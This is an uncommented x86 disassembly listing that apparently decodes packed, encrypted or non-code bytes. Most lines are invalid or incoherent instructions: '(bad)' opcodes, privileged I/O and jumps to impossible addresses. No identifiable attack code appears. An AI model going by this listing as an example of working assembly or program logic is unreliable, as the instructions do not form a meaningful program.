  40a81c:	mov    edi,0x1e45dbe1
  40a821:	pop    eax
  40a822:	pusha  
  40a823:	cdq    
  40a824:	pop    es
  40a825:	(bad)  
  40a826:	fisub  DWORD PTR [edx]
  40a828:	mov    ebp,0x85291987
  40a82d:	xchg   edi,eax
  40a82e:	arpl   WORD PTR [edi+0xebfde06],bx
  40a834:	xor    eax,0x2d708e80
  40a839:	and    al,0x9b
  40a83b:	fidiv  DWORD PTR [edi-0x34]
  40a83e:	adc    DWORD PTR [ebp+0x143ed323],esp
  40a844:	stos   BYTE PTR es:[edi],al
  40a845:	adc    BYTE PTR [ebx],dl
  40a847:	mov    BYTE PTR [edi+0x64],bl
  40a84a:	sub    al,al
  40a84c:	xor    ah,al
  40a84e:	add    DWORD PTR [ebp-0x521f64d0],eax
  40a854:	mov    DWORD PTR [edi+0x18],esi
  40a857:	sti    
  40a858:	pop    ebx
  40a859:	push   es
  40a85a:	mov    eax,0x134db72e
  40a85f:	js     0x40a877
  40a861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a862:	push   ebp
  40a863:	cmp    al,0xb2
  40a865:	adc    eax,0xaa126d2c
  40a86a:	outs   dx,BYTE PTR ds:[esi]
  40a86b:	jae    0x40a8b1
  40a86d:	mov    BYTE PTR [ebx+0x20],bh
  40a870:	repz ficom DWORD PTR [esi-0x974370d]
  40a877:	lock loopne 0x40a8ef
  40a87a:	repz mov esi,0x13d525ad
  40a880:	mov    eax,0x8e657d98
  40a885:	jo     0x40a857
  40a887:	or     eax,ebp
  40a889:	add    DWORD PTR [ebp-0x1d2f0fde],ebp
  40a88f:	fsub   QWORD PTR gs:[esp+ecx*2-0xe]
  40a894:	pop    ds
  40a895:	xor    DWORD PTR [edx],0x21
  40a898:	mov    edx,DWORD PTR [edx]
  40a89a:	shl    al,cl
  40a89c:	imul   esp,DWORD PTR [edi+0x72fa6a00],0x22d7063d
  40a8a6:	push   esp
  40a8a7:	xor    eax,DWORD PTR [ebp+0x31]
  40a8aa:	or     BYTE PTR [edx],bl
  40a8ac:	jb     0x40a83b
  40a8ae:	(bad)
  40a8b2:	iret   
  40a8b3:	cli    
  40a8b4:	mov    esi,0x1d88c532
  40a8b9:	xchg   DWORD PTR [eax+0x79abdfe9],esp
  40a8bf:	mov    ds:0xb8c98b0f,eax
  40a8c4:	mov    al,0xc6
  40a8c6:	push   ds
  40a8c7:	sub    ebp,DWORD PTR ds:0xba1bad5e
  40a8cd:	scas   al,BYTE PTR es:[edi]
  40a8ce:	in     eax,dx
  40a8cf:	out    0x5f,al
  40a8d1:	into   
  40a8d2:	push   0x59942bd
  40a8d7:	push   edi
  40a8d8:	punpcklbw mm0,DWORD PTR [ecx+0x27b73dd9]
  40a8df:	dec    ebx
  40a8e0:	pop    edi
  40a8e1:	scas   al,BYTE PTR es:[edi]
  40a8e2:	repz jmp 0xbf90:0x4bb9369d
  40a8ea:	xchg   ebp,eax
  40a8eb:	pop    ss
  40a8ec:	pop    es
  40a8ed:	mov    edi,0xdaeb9722
  40a8f2:	fadd   QWORD PTR [edx+edi*2+0x7d]
  40a8f6:	clc    
  40a8f7:	jbe    0x40a977
  40a8f9:	jge    0x40a897
  40a8fb:	(bad)  
  40a8fc:	xor    BYTE PTR [edi],dh
  40a8fe:	cmp    eax,0x93ab858a
  40a903:	adc    ebp,DWORD PTR [edi]
  40a905:	and    ch,cl
  40a907:	jl     0x40a957
  40a909:	and    al,0x3a
  40a90b:	jl     0x40a8f2
  40a90d:	jl     0x40a8da
  40a90f:	stc    
  40a910:	dec    eax
  40a911:	bound  ecx,QWORD PTR [esi+0x25084635]
  40a917:	and    ecx,DWORD PTR [esi]
  40a919:	test   DWORD PTR [ecx-0x1e],esi
  40a91c:	call   0xef62393
  40a921:	cmp    ah,dl
  40a923:	xchg   esp,eax
  40a925:	ds inc ebx
  40a927:	rol    dh,1
  40a929:	mov    eax,ds:0x72efcef
  40a92e:	pop    esp
  40a92f:	adc    esp,0xf3d6b78b
  40a935:	push   esp
  40a936:	shl    BYTE PTR [edi+0x32],cl
  40a939:	inc    ebx
  40a93a:	mov    bl,0xeb
  40a93c:	int    0xa7
  40a93e:	cmp    DWORD PTR [ebp-0x69],ebx
  40a941:	sub    dh,BYTE PTR [eax]
  40a943:	cdq    
  40a944:	mov    bl,0x2b
  40a946:	les    edi,FWORD PTR [edx+0x5c]
  40a949:	mov    dl,0xb
  40a94b:	xchg   esp,eax
  40a94c:	repz js 0x40a9c5
  40a94f:	mov    bl,0x54
  40a951:	jle    0x40a946
  40a953:	mov    eax,ds:0xfe5613bb
  40a958:	(bad)  
  40a959:	sub    BYTE PTR [edi+0x4],ch
  40a95c:	or     ch,BYTE PTR [esi]
  40a95e:	mov    ebp,0xecfdbec6
  40a963:	or     esi,eax
  40a965:	xor    eax,0x2059268b
  40a96a:	add    ecx,DWORD PTR [ebx]
  40a96c:	arpl   WORD PTR [esi],si
  40a96e:	in     eax,0xc6
  40a970:	xchg   edi,eax
  40a971:	jmp    0xae3656dc
  40a976:	rol    bl,1
  40a978:	pushf  
  40a979:	ror    BYTE PTR [ecx-0x7c],1
  40a97c:	dec    eax
  40a97d:	mov    eax,ds:0x6bef2ae5
  40a982:	int    0x53
  40a984:	jmp    0xcb9e1b8f
  40a989:	outs   dx,BYTE PTR ds:[esi]
  40a98a:	js     0x40a95e
  40a98c:	leave  
  40a98d:	add    al,0xb7
  40a98f:	mov    bl,0xdf
  40a991:	lods   al,BYTE PTR ds:[esi]
  40a992:	xor    eax,0x230fedd5
  40a997:	xor    ebx,DWORD PTR [eax-0x62]
  40a99a:	sbb    al,0x2a
  40a99c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a99d:	cdq    
  40a99e:	xchg   ebx,eax
  40a99f:	adc    ebp,eax
  40a9a1:	(bad)  
  40a9a2:	and    al,0x9f
  40a9a4:	je     0x40aa0b
  40a9a6:	dec    ebx
  40a9a7:	cmp    al,0xba
  40a9a9:	stos   DWORD PTR es:[edi],eax
  40a9aa:	pop    ds
  40a9ab:	retf   0xf738
  40a9ae:	and    eax,0xc47fa2b1
  40a9b3:	retf   0xee75
  40a9b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9b7:	call   0x2f3f:0xd16f1c98
  40a9be:	lea    edi,[ecx+0x5394938a]
  40a9c4:	dec    ebx
  40a9c5:	outs   dx,DWORD PTR ds:[esi]
  40a9c6:	lock push es
  40a9c8:	pop    edx
  40a9c9:	xchg   BYTE PTR [eax+ebp*8-0x5b],bl
  40a9cd:	ror    BYTE PTR [edx-0xb],0x1e
  40a9d1:	addr16 into 
  40a9d3:	outs   dx,BYTE PTR ds:[esi]
  40a9d4:	mov    edx,0x6d0c1d33
  40a9d9:	xchg   esi,eax
  40a9da:	imul   eax,DWORD PTR [eax],0xb4a72fb6
  40a9e0:	xor    DWORD PTR [ecx],esi
  40a9e2:	enter  0x686b,0x35
  40a9e6:	stos   DWORD PTR es:[edi],eax
  40a9e7:	xchg   esp,eax
  40a9e8:	mov    esp,0x3eaf82e9
  40a9ed:	adc    BYTE PTR [edx+ecx*8-0x6f],ch
  40a9f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9f2:	push   es
  40a9f3:	and    bh,BYTE PTR [ebp-0x2c808e3c]
  40a9f9:	pop    esp
  40a9fa:	add    DWORD PTR [ebp-0x69],esi
  40a9fd:	shr    BYTE PTR cs:[ebx+ebp*8-0x4a],cl
  40aa02:	mov    ds:0xcacd128a,al
  40aa07:	and    esp,edi
  40aa09:	sub    ebx,DWORD PTR [edi+0x469ddd8c]
  40aa0f:	cmp    BYTE PTR [esi-0x113e45f1],dl
  40aa15:	cs dec esi
  40aa17:	aaa    
  40aa18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa19:	out    dx,al
  40aa1a:	mov    DWORD PTR [edi-0x6a536b39],ecx
  40aa20:	pop    eax
  40aa21:	xor    bh,BYTE PTR [ecx+edx*8+0x46b8774]
  40aa28:	not    ebx
  40aa2a:	or     cl,dl
  40aa2c:	in     al,0xa4
  40aa2e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa30:	inc    ecx
  40aa31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa32:	pop    ss
  40aa33:	ja     0x40a9f0
  40aa35:	jbe    0x40a9c0
  40aa37:	push   0xd0cc8c49
  40aa3c:	xchg   edi,eax
  40aa3d:	jnp    0x40aa4a
  40aa3f:	dec    ebx
  40aa40:	ins    BYTE PTR es:[edi],dx
  40aa41:	in     eax,dx
  40aa42:	ja     0x40aa68
  40aa44:	sbb    DWORD PTR [eax+0x28034d13],edi
  40aa4a:	(bad)  
  40aa4b:	sbb    BYTE PTR [ebp-0xf27a35a],ah
  40aa51:	pusha  
  40aa52:	ds dec esp
  40aa54:	or     edi,edi
  40aa56:	and    ch,ah
  40aa58:	sbb    eax,0x6cfe310f
  40aa5d:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa5f:	rol    DWORD PTR [esp+edi*4+0x74],cl
  40aa63:	adc    DWORD PTR [ecx-0x2d4dcc8b],edi
  40aa69:	inc    esp
  40aa6a:	cs pop ds
  40aa6c:	out    0xe9,eax
  40aa6e:	xor    al,0x2b
  40aa70:	jge    0x40aaae
  40aa72:	xchg   edx,eax
  40aa73:	jb     0x40aae8
  40aa75:	shl    DWORD PTR [ebx],cl
  40aa77:	and    BYTE PTR [esi],0x7c
  40aa7a:	adc    eax,0xb620a710
  40aa7f:	call   0x8f84679f
  40aa84:	adc    bl,BYTE PTR [edi+0x8]
  40aa87:	popf   
  40aa88:	mov    dl,0x2f
  40aa8a:	in     eax,0x32
  40aa8c:	mov    esp,DWORD PTR [esi-0x3ecc6fcb]
  40aa92:	mov    edx,0x3272db
  40aa97:	add    eax,edx
  40aa99:	mov    DWORD PTR [ebp+0x8],eax
  40aa9c:	mov    eax,DWORD PTR [ebp-0x14]
  40aa9f:	xor    eax,ecx
  40aaa1:	add    eax,edx
  40aaa3:	mov    edx,DWORD PTR [ebp+0x14]
  40aaa6:	imul   eax,DWORD PTR [edx]
  40aaa9:	mov    edx,DWORD PTR [ebp-0x4]
  40aaac:	xor    edx,ecx
  40aaae:	mov    ecx,DWORD PTR [ebp+0x8]
  40aab1:	lea    ecx,[edx+ecx*1+0x3272db]
  40aab8:	jmp    0x40ce47
  40aabd:	inc    esi
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	mov    esp,0x5a393f3
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	rcl    bl,cl
  40aac7:	mov    edx,0x32c9bc
  40aacc:	jp     0x40ab22
  40aace:	hlt    
  40aacf:	bound  esp,QWORD PTR [edx+0x10]
  40aad2:	pop    edi
  40aad3:	bound  esp,QWORD PTR [edx+0x32]
  40aad6:	fnsave [ebx-0x49]
  40aad9:	test   DWORD PTR [esi],edx
  40aadb:	mov    ds:0x9ad3a786,eax
  40aae0:	xor    DWORD PTR [ebp-0xaf7449a],0x2aea600a
  40aaea:	and    eax,0x8c9260a4
  40aaef:	and    BYTE PTR cs:[ebp+0x13272d93],ah
  40aaf6:	scas   eax,DWORD PTR es:[edi]
  40aaf7:	ins    DWORD PTR es:[edi],dx
  40aaf8:	push   ecx
  40aaf9:	shr    edi,1
  40aafb:	imul   BYTE PTR [edx]
  40aafd:	push   0xe75396c7
  40ab02:	mov    eax,0xd02ec2ee
  40ab07:	or     BYTE PTR [edi-0x5f],dh
  40ab0a:	pop    ebx
  40ab0b:	dec    eax
  40ab0c:	inc    eax
  40ab0d:	popf   
  40ab0e:	dec    edi
  40ab0f:	dec    eax
  40ab10:	mov    cl,0xf9
  40ab12:	xchg   ebp,eax
  40ab13:	push   ebp
  40ab14:	jp     0x40aaff
  40ab16:	hlt    
  40ab17:	mov    eax,ds:0x1939ed63
  40ab1c:	pusha  
  40ab1d:	in     al,dx
  40ab1e:	int    0xa
  40ab20:	popf   
  40ab21:	xchg   edx,eax
  40ab22:	(bad)  
  40ab23:	fcomp  QWORD PTR [ecx]
  40ab25:	add    BYTE PTR [eax+0x8],dh
  40ab28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab29:	inc    ebx
  40ab2a:	pop    edx
  40ab2b:	push   ebp
  40ab2c:	inc    edi
  40ab2d:	and    esp,edx
  40ab2f:	jno    0x40aba1
  40ab31:	inc    esp
  40ab32:	fldcw  WORD PTR [edx]
  40ab34:	mov    ds:0x5d345ea5,eax
  40ab39:	sbb    al,0xd6
  40ab3b:	stos   DWORD PTR es:[edi],eax
  40ab3c:	push   ebx
  40ab3d:	xor    edx,DWORD PTR [esi-0x7e]
  40ab40:	xor    al,0xb3
  40ab42:	test   DWORD PTR [esi+0x5e],edx
  40ab45:	push   eax
  40ab46:	sar    BYTE PTR [eax],cl
  40ab48:	mov    eax,ds:0xe8d31921
  40ab4d:	das    
  40ab4e:	int    0x1d
  40ab50:	popf   
  40ab51:	test   BYTE PTR [ecx+0x3],ch
  40ab54:	loopne 0x40abac
  40ab56:	loop   0x40ab74
  40ab58:	int3   
  40ab59:	mov    bh,0x1f
  40ab5b:	jle    0x40ab4c
  40ab5d:	and    esi,DWORD PTR [esi+ebx*2+0x66e912b4]
  40ab64:	sub    dh,dh
  40ab66:	in     al,dx
  40ab67:	enter  0x446b,0xbf
  40ab6b:	out    0x16,eax
  40ab6d:	mov    bl,0xd2
  40ab6f:	pop    esp
  40ab70:	pop    edi
  40ab71:	popf   
  40ab72:	cdq    
  40ab73:	and    dh,BYTE PTR [eax]
  40ab75:	cmc    
  40ab76:	lahf   
  40ab77:	mov    dh,0xbd
  40ab79:	ret    0x531d
  40ab7c:	pop    ds
  40ab7d:	retf   0x987f
  40ab80:	fldcw  WORD PTR [ebx+esi*2-0xbfcbd61]
  40ab87:	mov    edi,0xfc3bcc27
  40ab8c:	dec    edi
  40ab8d:	mov    edx,fs
  40ab8f:	shl    DWORD PTR [edi],1
  40ab91:	(bad)  
  40ab93:	scas   eax,DWORD PTR es:[edi]
  40ab94:	stc    
  40ab95:	and    edi,DWORD PTR [esi-0x3242dc7d]
  40ab9b:	pop    edx
  40ab9c:	lea    ebp,[ebx]
  40ab9e:	ficomp DWORD PTR [edi-0x31]
  40aba1:	push   edi
  40aba2:	js     0x40aba8
  40aba4:	call   0x7715:0x5e4fab9d
  40abab:	mov    esp,0x2d6672ca
  40abb0:	out    0x54,eax
  40abb2:	or     BYTE PTR [ecx-0x1c],dl
  40abb5:	and    eax,0x59fafb49
  40abba:	pop    esi
  40abbb:	push   eax
  40abbc:	std    
  40abbd:	dec    edi
  40abbe:	mov    ebp,0x78ad3651
  40abc3:	imul   ebx,DWORD PTR ds:0xc585036,0x72e70801
  40abcd:	mov    bh,0xd
  40abcf:	ins    BYTE PTR es:[edi],dx
  40abd0:	add    DWORD PTR [ebx+0x3e728d5b],edi
  40abd6:	nop
  40abd7:	or     al,BYTE PTR [ebx+0x18]
  40abda:	mov    BYTE PTR [ebx+0x4057476c],al
  40abe0:	xor    ch,dh
  40abe2:	shl    DWORD PTR es:[eax+0x49f11c9c],0x6c
  40abea:	fiadd  DWORD PTR [eax]
  40abec:	sbb    ebx,edi
  40abee:	(bad)  
  40abef:	inc    ecx
  40abf0:	dec    eax
  40abf1:	push   0x82b1298b
  40abf6:	pop    ebp
  40abf7:	jnp    0x40ac10
  40abf9:	push   cs
  40abfa:	test   BYTE PTR [ebx],dl
  40abfc:	add    DWORD PTR [eax+0x6e],eax
  40abff:	enter  0xd241,0xbd
  40ac03:	mov    ah,0x7e
  40ac05:	adc    edx,DWORD PTR [ebp-0x24]
  40ac08:	int3   
  40ac09:	add    al,dl
  40ac0b:	jge    0x40ac5b
  40ac0d:	jecxz  0x40abab
  40ac0f:	add    eax,0xc3e0d71c
  40ac14:	cmc    
  40ac15:	fild   WORD PTR [edi]
  40ac17:	inc    edx
  40ac18:	mov    DWORD PTR [ecx-0x7d9de265],edx
  40ac1e:	mov    bh,0x6d
  40ac20:	fwait
  40ac21:	imul   edx,edi,0x56d35719
  40ac27:	inc    ebx
  40ac28:	add    edx,DWORD PTR [esi+ecx*2-0x36c746b8]
  40ac2f:	xchg   edx,eax
  40ac30:	dec    esp
  40ac31:	scas   eax,DWORD PTR es:[edi]
  40ac32:	repnz mov dh,0x17
  40ac35:	test   BYTE PTR [edi-0x1cd28bba],0xe
  40ac3c:	add    ebp,DWORD PTR [esi]
  40ac3e:	sbb    DWORD PTR [edx-0x23],edi
  40ac41:	sbb    ch,BYTE PTR ds:[ecx+0x2b0359a9]
  40ac48:	sbb    ch,0x9d
  40ac4b:	jbe    0x40acca
  40ac4d:	popa   
  40ac4e:	mov    dl,0x9c
  40ac50:	lock or al,0xd1
  40ac53:	fsub   DWORD PTR [ebp+0x2a]
  40ac56:	mov    ebp,0x1963cbb8
  40ac5b:	lds    edx,FWORD PTR [eax-0x4b73f34f]
  40ac61:	pusha  
  40ac62:	dec    eax
  40ac63:	add    al,0xb8
  40ac65:	fwait
  40ac66:	mov    al,0x8e
  40ac68:	xor    BYTE PTR [edi],0x1e
  40ac6b:	int    0x9b
  40ac6d:	addr16 jmp 0xf8c9bb5e
  40ac73:	jmp    0x40ac61
  40ac75:	stos   DWORD PTR es:[edi],eax
  40ac76:	add    BYTE PTR [edi+0x25],bh
  40ac79:	fcomp  DWORD PTR [edi]
  40ac7b:	sub    al,0xb4
  40ac7d:	jae    0x40ac4a
  40ac7f:	cmp    ah,BYTE PTR [ebx-0x2abe13e3]
  40ac85:	leave  
  40ac86:	mov    BYTE PTR [edi-0x39],ah
  40ac89:	inc    ebp
  40ac8a:	sub    eax,DWORD PTR [ebx-0x2b075d13]
  40ac90:	pop    edi
  40ac91:	and    cl,BYTE PTR [ebx+0x7193d2ce]
  40ac97:	mov    edi,DWORD PTR [esi+ecx*1-0xf]
  40ac9b:	stos   BYTE PTR es:[edi],al
  40ac9c:	add    al,0x1b
  40ac9e:	add    al,0x85
  40aca0:	xchg   ebx,eax
  40aca1:	psrlw  mm3,QWORD PTR [esi-0x736309e1]
  40aca8:	pop    ecx
  40aca9:	fs xchg ebp,eax
  40acab:	gs jnp 0x40ac33
  40acae:	nop
  40acaf:	outs   dx,BYTE PTR cs:[esi]
  40acb1:	or     esi,DWORD PTR [eax-0x12]
  40acb4:	ja     0x40ac3c
  40acb6:	in     eax,dx
  40acb7:	in     al,dx
  40acb8:	mov    dl,0x5e
  40acba:	sti    
  40acbb:	mov    al,ds:0x602a3cde
  40acc0:	sbb    bl,dl
  40acc2:	out    dx,al
  40acc3:	sub    eax,0xa6541b6
  40acc8:	jns    0x40acf3
  40acca:	rcl    BYTE PTR [ecx-0xfe6931c],1
  40acd0:	popa   
  40acd1:	cld    
  40acd2:	xchg   ebp,eax
  40acd3:	push   eax
  40acd4:	popa   
  40acd5:	add    DWORD PTR [ebx-0x5d],ecx
  40acd8:	setbe  BYTE PTR [ecx+0x2e]
  40acdc:	mov    ebx,0x38d7c207
  40ace1:	push   ss
  40ace2:	adc    eax,0x58212457
  40ace7:	stos   BYTE PTR es:[edi],al
  40ace8:	sub    edi,ebx
  40acea:	mov    esi,0x8b60f16b
  40acef:	rcr    esp,0x73
  40acf2:	inc    BYTE PTR [eax]
  40acf4:	imul   esi,DWORD PTR [edi],0x8390796b
  40acfa:	ficom  DWORD PTR [ebp+0x4e5b077e]
  40ad00:	or     eax,0x2e4f81ae
  40ad05:	or     BYTE PTR [edi],bh
  40ad07:	(bad)  
  40ad08:	sbb    esi,DWORD PTR [esi-0x56c5818]
  40ad0e:	shr    DWORD PTR [eax+edi*4],0xd4
  40ad12:	jmp    0x3283:0xf77cc559
  40ad19:	sub    DWORD PTR [edx-0x50],esi
  40ad1c:	sub    ebx,0x728ab5eb
  40ad22:	and    DWORD PTR [ebp-0x72],ebp
  40ad25:	gs push es
  40ad27:	sub    BYTE PTR [edi+0x5],0x67
  40ad2b:	jmp    0x22d4ecc6
  40ad30:	stos   BYTE PTR es:[edi],al
  40ad31:	inc    esi
  40ad32:	adc    eax,0x6cafa8c
  40ad37:	mov    dl,0xaf
  40ad3a:	sti    
  40ad3b:	mov    esi,0xa74047b6
  40ad40:	imul   BYTE PTR [edx]
  40ad42:	cmp    al,0x4f
  40ad44:	fsubrp st(7),st
  40ad46:	pop    es
  40ad47:	test   al,0xd3
  40ad49:	mov    BYTE PTR [ebx],ah
  40ad4b:	mov    ah,0x74
  40ad4d:	push   ebx
  40ad4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad4f:	and    al,0xf1
  40ad51:	fimul  DWORD PTR [edx+ebx*1+0xc3f4534]
  40ad58:	xchg   ecx,eax
  40ad59:	adc    ebp,edi
  40ad5b:	jbe    0x40acf0
  40ad5d:	pop    esi
  40ad5e:	hlt    
  40ad5f:	icebp  
  40ad60:	jbe    0x40ace8
  40ad62:	sub    DWORD PTR [edi+0x78],ebp
  40ad65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad66:	dec    esi
  40ad67:	call   0x2acde97b
  40ad6c:	fdiv   DWORD PTR [esi]
  40ad6e:	mov    edi,0xa127cb7d
  40ad73:	lods   eax,DWORD PTR ds:[esi]
  40ad74:	xchg   edi,eax
  40ad75:	fbld   TBYTE PTR es:[ebx]
  40ad78:	push   ss
  40ad79:	inc    esi
  40ad7a:	sbb    BYTE PTR [esi],0xf
  40ad7d:	dec    edx
  40ad7e:	inc    ebp
  40ad7f:	jmp    0xbcd6d184
  40ad84:	fidiv  DWORD PTR [ebx-0x20]
  40ad87:	push   ecx
  40ad88:	add    edi,edi
  40ad8a:	enter  0xfa91,0x50
  40ad8e:	loope  0x40ad98
  40ad90:	repz ror DWORD PTR [ecx-0x4524347],1
  40ad97:	sub    cl,BYTE PTR [eax]
  40ad99:	popf   
  40ad9a:	add    bl,BYTE PTR [edx-0x611f583c]
  40ada0:	inc    edx
  40ada1:	add    cl,BYTE PTR [edx-0x4c]
  40ada4:	stos   DWORD PTR es:[edi],eax
  40ada5:	xor    bh,BYTE PTR [edi-0x3a]
  40ada8:	xor    eax,0x2d16233e
  40adad:	xchg   esp,eax
  40adae:	(bad)  
  40adaf:	mov    gs,WORD PTR [edi-0x32]
  40adb2:	xor    cl,BYTE PTR [edi+0x7beb9aa4]
  40adb8:	sub    al,0x9b
  40adba:	xor    BYTE PTR [esi],0x25
  40adbd:	push   eax
  40adbe:	adc    BYTE PTR [ecx-0x2dcb8144],bl
  40adc4:	retf   0x69b5
  40adc7:	xor    eax,0x62033be1
  40adcc:	bound  esp,QWORD PTR cs:[edx]
  40adcf:	fnstenv [eax+ebx*8]
  40add2:	jmp    0x40ad9d
  40add4:	stos   BYTE PTR es:[edi],al
  40add5:	leave  
  40add6:	rcr    DWORD PTR [edi-0x36ec93b1],cl
  40addc:	call   DWORD PTR [ebx]
  40adde:	in     al,0x4f
  40ade0:	stos   DWORD PTR es:[edi],eax
  40ade1:	lods   eax,DWORD PTR ds:[esi]
  40ade2:	ds jge 0x40ae4c
  40ade5:	xor    eax,DWORD PTR [edx+0x30]
  40ade8:	sub    eax,DWORD PTR [ecx+0x73a8f978]
  40adee:	ds sbb al,0xa
  40adf1:	fs into 
  40adf3:	mov    cl,0x61
  40adf5:	popf   
  40adf6:	mov    ah,0xaa
  40adf8:	and    BYTE PTR [ebp-0x3e],cl
  40adfb:	jge    0x40adc9
  40adfd:	test   DWORD PTR [ebx],0x4b22cbd5
  40ae03:	pop    ds
  40ae04:	xchg   DWORD PTR ds:0x8762321b,esi
  40ae0a:	mov    ebp,0x71d743b5
  40ae0f:	cmp    al,0xdb
  40ae11:	aaa    
  40ae12:	cmp    bh,BYTE PTR [ebx]
  40ae14:	iret   
  40ae15:	push   edx
  40ae16:	add    BYTE PTR [ebp-0x10],cl
  40ae19:	jle    0x40add1
  40ae1b:	pop    es
  40ae1c:	xor    edx,DWORD PTR [bx+di-0x3c40]
  40ae21:	pop    edi
  40ae22:	push   cs
  40ae23:	pop    ss
  40ae24:	cli    
  40ae25:	ins    DWORD PTR es:[edi],dx
  40ae26:	mov    BYTE PTR [eax+esi*4+0x24074380],al
  40ae2d:	inc    eax
  40ae2e:	dec    edx
  40ae2f:	fwait
  40ae30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae31:	cmp    ah,BYTE PTR [ebp+ebp*2+0x1561c248]
  40ae38:	ins    DWORD PTR es:[edi],dx
  40ae39:	shl    esi,1
  40ae3b:	sahf   
  40ae3c:	jp     0x40aea5
  40ae3e:	js     0x40ae0d
  40ae40:	adc    DWORD PTR [ecx+0x61fe08dd],ebp
  40ae46:	cwde   
  40ae47:	or     al,BYTE PTR [edi+0x44]
  40ae4a:	ret    
  40ae4b:	std    
  40ae4c:	fstp   QWORD PTR [eax]
  40ae4e:	mov    BYTE PTR [ebp+0x5f],0x29
  40ae52:	xchg   dl,cl
  40ae54:	dec    ebx
  40ae55:	test   al,0x73
  40ae57:	out    dx,al
  40ae58:	fwait
  40ae59:	mov    ecx,0xc0e8e36e
  40ae5e:	fimul  DWORD PTR [edx]
  40ae60:	mov    ds:0xb247c6c6,al
  40ae65:	dec    ebx
  40ae66:	retf   
  40ae67:	stos   DWORD PTR es:[edi],eax
  40ae68:	jb     0x40ae59
  40ae6a:	lahf   
  40ae6b:	or     eax,0x665d735e
  40ae70:	dec    eax
  40ae71:	imul   esp,DWORD PTR [ebx],0x888e892b
  40ae77:	imul   eax,DWORD PTR [edi],0xffffffd0
  40ae7a:	pop    es
  40ae7b:	mov    ebp,0x751f465b
  40ae80:	loope  0x40ae97
  40ae82:	dec    ebx
  40ae83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae84:	(bad)  
  40ae85:	mov    ah,0xc4
  40ae87:	mov    edx,0xf007e55d
  40ae8c:	icebp  
  40ae8d:	es cmp eax,0x3966e817
  40ae93:	sbb    ah,BYTE PTR [esi+eax*8]
  40ae96:	adc    ah,BYTE PTR [esi+0x5534ed36]
  40ae9c:	jns    0x40ae21
  40ae9e:	test   eax,0xd981b929
  40aea3:	je     0x40af0d
  40aea5:	repnz adc BYTE PTR [ecx],0xe4
  40aea9:	sbb    ecx,esi
  40aeab:	adc    DWORD PTR [eax-0x50],ebx
  40aeae:	aaa    
  40aeaf:	jo     0x40aee1
  40aeb1:	sbb    al,0x42
  40aeb3:	or     eax,0xb032cf66
  40aeb8:	sub    DWORD PTR [edi-0x5f4168ce],ebp
  40aebe:	cld    
  40aebf:	shl    DWORD PTR [edi],0xec
  40aec2:	push   0x1f
  40aec4:	pop    es
  40aec5:	shl    DWORD PTR ds:0xfbea94a,1
  40aecb:	mov    eax,0xdcd5140f
  40aed0:	rcl    BYTE PTR [edx+0x1c],0x6
  40aed4:	push   ebp
  40aed5:	stos   DWORD PTR es:[edi],eax
  40aed6:	mov    ah,0xc4
  40aed8:	shr    BYTE PTR [eax],0x30
  40aedb:	and    al,0x76
  40aedd:	jmp    0x6c0ca7a4
  40aee2:	arpl   WORD PTR [eax],si
  40aee4:	imul   DWORD PTR [edi-0x64cadaf8]
  40aeea:	inc    edi
  40aeeb:	push   edx
  40aeec:	add    al,0x4
  40aeee:	push   esi
  40aeef:	repz int 0x6b
  40aef2:	popa   
  40aef3:	xchg   ecx,eax
  40aef4:	mov    eax,ds:0xdb6c82e7
  40aef9:	scas   al,BYTE PTR es:[edi]
  40aefa:	xchg   ebx,eax
  40aefb:	sbb    al,0x91
  40aefd:	iret   
  40aefe:	jb     0x40af0e
  40af00:	mov    al,0x9b
  40af02:	pop    ss
  40af03:	cmc    
  40af04:	in     eax,dx
  40af05:	dec    esp
  40af06:	inc    esi
  40af07:	cld    
  40af08:	push   cs
  40af09:	mov    cl,0x34
  40af0b:	imul   ebp,DWORD PTR ds:0x4445ee97,0x30
  40af12:	ficom  WORD PTR [edx-0x3b]
  40af15:	inc    eax
  40af16:	xor    eax,0x6b4ff893
  40af1b:	inc    esp
  40af1c:	es push esp
  40af1e:	add    BYTE PTR [ebp-0x3d8888db],dl
  40af24:	fbstp  TBYTE PTR [esi]
  40af26:	fdivr  st(4),st
  40af28:	mov    ds:0xf84775a6,al
  40af2d:	shl    DWORD PTR [edi],0x31
  40af30:	daa    
  40af31:	outs   dx,DWORD PTR ds:[esi]
  40af32:	stos   BYTE PTR es:[edi],al
  40af33:	sar    DWORD PTR [edi+0xa],0x44
  40af37:	jmp    0x40af2d
  40af39:	sub    al,0xa2
  40af3b:	or     bl,0xa9
  40af3e:	mov    ah,0x43
  40af40:	add    edi,DWORD PTR [esi+0x3fd3c69b]
  40af46:	popf   
  40af47:	in     al,0x29
  40af49:	data16 xor al,0x35
  40af4c:	xor    BYTE PTR [edx+0xa428a2],cl
  40af52:	pushf  
  40af53:	out    0xa8,eax
  40af55:	mov    WORD PTR [ecx],cs
  40af57:	in     al,dx
  40af58:	(bad)  
  40af59:	adc    eax,0x3a74aaaf
  40af5e:	mov    cl,0xd0
  40af60:	(bad)  
  40af61:	cld    
  40af62:	push   cs
  40af63:	test   DWORD PTR [esi-0x3c],esi
  40af66:	popf   
  40af67:	aad    0x3a
  40af69:	cmp    al,0xe9
  40af6b:	enter  0x5c02,0x5c
  40af6f:	xchg   edx,eax
  40af70:	ss repnz aaa 
  40af73:	scas   eax,DWORD PTR es:[edi]
  40af74:	jecxz  0x40afb7
  40af76:	rol    BYTE PTR [ebp-0x12],0x91
  40af7a:	fld    TBYTE PTR [ebx]
  40af7c:	lea    ecx,[ebp+ebp*2-0x44]
  40af80:	xor    ax,0x4a6e
  40af84:	xor    al,0x8e
  40af86:	jns    0x40af38
